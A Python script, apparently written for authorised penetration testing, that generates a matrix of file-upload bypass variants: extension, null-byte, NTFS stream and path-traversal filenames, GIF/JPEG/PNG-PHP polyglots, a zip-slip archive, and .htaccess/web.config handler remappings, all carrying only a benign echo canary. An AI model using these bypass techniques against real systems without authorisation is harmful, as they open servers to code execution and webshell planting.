#!/usr/bin/env python3
"""upload_bypass_gen.py - offline upload-validation bypass variant generator.

Given a base filename (e.g. shell.php), emit a variants matrix to stdout or
--out FILE: filename variants, content variants, and polyglot byte-level
recipes. The only code content emitted is the benign canary form
(`<?php echo "rj-pt-<engagement>-<nonce>"; ?>`); no webshells, no command
loops. Upload results are tried one variant at a time by the operator
(serial, P5 discipline); this script performs no network access.

Usage:
  python3 upload_bypass_gen.py --base-name shell.php [--canary STRING] \
      [--out FILE]

Exit codes: 0 = matrix generated; 1 = bad arguments or write failure.
No scope guard: offline generator, sends nothing.
"""

import argparse
import os
import sys
import tempfile

DEFAULT_CANARY = "rj-pt-<engagement>-<nonce>"

PHP_SIBLINGS = ["php3", "php4", "php5", "php7", "phtml", "pht", "phar"]
ASP_SIBLINGS = ["asa", "cer", "cdx"]
JSP_SIBLINGS = ["jspx", "jspa", "jsw"]


def _stem_ext(base_name):
    stem, _, ext = base_name.rpartition(".")
    if not stem:
        return base_name, ""
    return stem, ext.lower()


def filename_variants(base_name):
    """Return a list of (technique, filename, what-it-tests) tuples."""
    stem, ext = _stem_ext(base_name)
    stem = stem or "shell"
    ext = ext or "php"
    variants = []

    def add(technique, name, tests):
        variants.append((technique, name, tests))

    add("case", "%s.%s" % (stem, ext.upper()),
        "blocklists matching lowercase .%s only" % ext)
    add("case", "%s.%s%s" % (stem, ext[0].upper(), ext[1:]),
        "blocklists matching lowercase .%s only" % ext)

    siblings = []
    if ext in ("php", "php3", "php4", "php5", "php7", "phtml", "pht", "phar"):
        siblings = PHP_SIBLINGS
    elif ext in ("asp", "aspx"):
        siblings = ASP_SIBLINGS
    elif ext in ("jsp", "jspx"):
        siblings = JSP_SIBLINGS
    for sib in siblings:
        if sib == ext:
            continue
        add("sibling-extension", "%s.%s" % (stem, sib),
            "server maps .%s to the same handler as .%s" % (sib, ext))

    for image in ("jpg", "png", "gif"):
        add("double-extension", "%s.%s.%s" % (stem, ext, image),
            "'ends-with image' checks; Apache multi-dot AddHandler")
        add("double-extension", "%s.%s.%s" % (stem, image, ext),
            "basename/ext-position confusion")
    add("double-extension", "%s.%s.txt" % (stem, ext),
        "allowlists accepting .txt content uploads")

    add("trailing-char", "%s.%s." % (stem, ext),
        "regex \\.%s$ mismatches; Windows strips trailing dot" % ext)
    add("trailing-char", "%s.%s " % (stem, ext),
        "Windows strips trailing space before comparing")

    add("null-byte", "%s.%s%%00.jpg" % (stem, ext),
        "legacy PHP<5.3.4 / old Java URL handlers (mark legacy)")
    add("null-byte", "%s.%s\\x00.jpg" % (stem, ext),
        "raw NUL variant for binary transports (legacy stacks)")

    add("ntfs-ads", "%s.%s::$DATA" % (stem, ext),
        "IIS/NTFS alternate data stream; blocklist sees .%s" % ext)
    add("ntfs-ads", "%s.%s:.jpg" % (stem, ext),
        "NTFS ADS write; creates stream not .jpg file")

    add("semicolon", "%s.asp;.jpg" % stem,
        "IIS 6/7.x classic parses name up to ';'")

    add("unicode", "%s\u200b.%s" % (stem, ext),
        "zero-width char defeats naive normalization/regex (verify stored name)")

    add("path-traversal", "../../%s.%s" % (stem, ext),
        "filename joined into storage path (CAUTION: may leave webroot)")
    add("path-traversal", "..\\..\\%s.%s" % (stem, ext),
        "windows-style traversal in filename (CAUTION: same)")

    return variants


def content_variants(canary):
    """Return a list of (name, content, what-it-tests) tuples."""
    php_canary = '<?php echo "%s"; ?>' % canary
    variants = [
        ("php-echo-canary", php_canary,
         "baseline executable content: canary echo only"),
        ("gif-magic", "GIF89a\n" + php_canary,
         "getimagesize()-only checks; GIF magic bytes satisfy sniffers"),
        ("php-after-jpeg-comment",
         "bytes: FF D8 [SOI] + FF E0 [APP0/JFIF] + FF FE <len16> "
         "containing the php-echo-canary text + FF D9 [EOI]",
         "content sniffers that parse the image and ignore comments"),
        ("htaccess", "AddType application/x-httpd-php .rjpt",
         "Apache: upload as .htaccess, then upload canary content as "
         "%s.rjpt" % "shell"),
        ("web.config",
         "<configuration><system.webServer><handlers><add name=\"rjpt\" "
         "path=\"*.rjpt\" verb=\"*\" "
         "modules=\"IsapiModule\" "
         "scriptProcessor=\"%windir%\\Microsoft.NET\\Framework64\\v4.0.30319"
         "\\aspnet_isapi.dll\" requireAccess=\"Script\" /></handlers>"
         "</system.webServer></configuration>",
         "IIS: map *.rjpt to ASP.NET, then upload canary content as .rjpt"),
    ]
    return variants


def polyglot_recipes(canary):
    """Return a list of (name, byte-level description) tuples."""
    php = '<?php echo "%s"; ?>' % canary
    return [
        ("gif-php",
         "47 49 46 38 39 61 (GIF89a) + 0A + %r" % php),
        ("jpeg-php",
         "FF D8 (SOI) + FF E0 00 10 4A 46 49 46 00 (APP0/JFIF) + "
         "FF FE <len16> + %r + FF D9 (EOI)" % php),
        ("png-php",
         "89 50 4E 47 0D 0A 1A 0A (signature) + minimal IHDR + tEXt chunk "
         "(74 45 58 74 + 'Payload\\0' + %r + CRC32 of chunk data) + IEND"
         % php),
        ("zip-slider",
         "standard ZIP archive with entry name "
         "'../../../../var/www/html/x.rjpt' containing %r "
         "(zip-slip on extraction)" % php),
    ]


def generate(base_name, canary):
    lines = []
    lines.append("== upload bypass variants (base: %s) ==" % base_name)
    lines.append("== canary: %s ==" % canary)
    lines.append("")
    lines.append("-- filename variants (upload one at a time, serial) --")
    for technique, name, tests in filename_variants(base_name):
        lines.append("[%-18s] %-28r tests: %s" % (technique, name, tests))
    lines.append("")
    lines.append("-- content variants --")
    for name, content, tests in content_variants(canary):
        lines.append("[%-20s] %s" % (name, content))
        lines.append("    tests: %s" % tests)
    lines.append("")
    lines.append("-- polyglot byte-level recipes (descriptions; build in "
                 "the container) --")
    for name, recipe in polyglot_recipes(canary):
        lines.append("[%s] %s" % (name, recipe))
    lines.append("")
    lines.append("notes:")
    lines.append("- upload serially, one variant at a time (P5 discipline);")
    lines.append("  record exactly which variant was accepted and where.")
    lines.append("- path-traversal/zip variants may write outside the")
    lines.append("  webroot: coordinate with the operator before use.")
    lines.append("- after a canary echo proof: delete every uploaded file,")
    lines.append("  re-request until 404, keep the 404 pair as cleanup")
    lines.append("  evidence (references/impact-safety.md).")
    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------- self-test


def self_test():
    variants = filename_variants("shell.php")
    techniques = {t for t, _, _ in variants}
    required = {"case", "sibling-extension", "double-extension",
                "trailing-char", "null-byte", "ntfs-ads", "semicolon",
                "unicode", "path-traversal"}
    assert required <= techniques, "missing techniques: %s" % (
        required - techniques)
    assert len(variants) >= 15, "expected >= 15 filename variants, got %d" % len(variants)
    for _t, name, _tests in variants:
        assert "shell" in name, "variant lost base stem: %r" % name
    names = [name for _t, name, _tests in variants]
    assert "shell.PHP" in names, "case variant missing"
    assert "shell.php5" in names, "sibling variant missing"
    assert "shell.php.jpg" in names, "double-extension variant missing"
    assert "shell.php%00.jpg" in names, "null-byte variant missing"
    assert "shell.php::$DATA" in names, "NTFS ADS variant missing"
    assert any(n.startswith("shell.asp;") for n in names), "semicolon missing"

    canary = "rj-pt-selftest-n1"
    contents = content_variants(canary)
    assert len(contents) >= 4, "expected >= 4 content variants"
    assert contents[0][1] == '<?php echo "%s"; ?>' % canary
    assert contents[1][1].startswith("GIF89a"), "gif magic variant missing"
    names = [n for n, _c, _t in contents]
    assert "htaccess" in names and "web.config" in names

    recipes = polyglot_recipes(canary)
    assert len(recipes) >= 4, "expected >= 4 polyglot recipes"
    assert recipes[0][1].startswith("47 49 46 38 39 61"), "gif recipe broken"

    # asp base-name routes to asp siblings
    asp_vars = filename_variants("shell.asp")
    asp_names = [n for _t, n, _tests in asp_vars]
    assert "shell.asa" in asp_names and "shell.cer" in asp_names

    # stem without extension defaults to .php handling
    noext = filename_variants("shell")
    assert any(n.startswith("shell.") for n in [n for _t, n, _x in noext])

    # generate() text renders and --out round-trips through a temp file
    text = generate("shell.php", canary)
    assert "== upload bypass variants" in text
    assert "[case" in text and "[gif-php]" in text and "notes:" in text
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "matrix.txt")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)
        with open(path, "r", encoding="utf-8") as fh:
            assert fh.read() == text

    print("[self-test] upload_bypass_gen: %d filename variants, %d content "
          "variants, %d polyglot recipes, asp-routing and output round-trip "
          "passed" % (len(variants), len(contents), len(recipes)))


# ---------------------------------------------------------------- cli


class _Parser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        sys.stderr.write("error: %s\n" % message)
        sys.exit(1)


def main():
    parser = _Parser(
        description="Offline upload-bypass variant matrix generator.")
    parser.add_argument("--base-name", default="shell.php",
                        help="base filename, e.g. shell.php (default)")
    parser.add_argument("--canary", default=DEFAULT_CANARY,
                        help="canary string placed in benign echo content")
    parser.add_argument("--out", default=None,
                        help="also write the matrix to this file")
    parser.add_argument("--self-test", action="store_true",
                        help="run offline self-test (fixtures) and exit")
    args = parser.parse_args()

    if args.self_test:
        self_test()
        return

    if "/" in args.base_name or "\\" in args.base_name:
        parser.error("--base-name must be a bare filename "
                     "(path traversal variants are generated for you)")
    text = generate(args.base_name, args.canary)
    print(text, end="")
    if args.out:
        try:
            with open(args.out, "w", encoding="utf-8") as fh:
                fh.write(text)
        except OSError as err:
            sys.stderr.write("[error] cannot write %s: %s\n"
                             % (args.out, err))
            sys.exit(1)
        print("[out] matrix written to %s" % args.out)


if __name__ == "__main__":
    main()
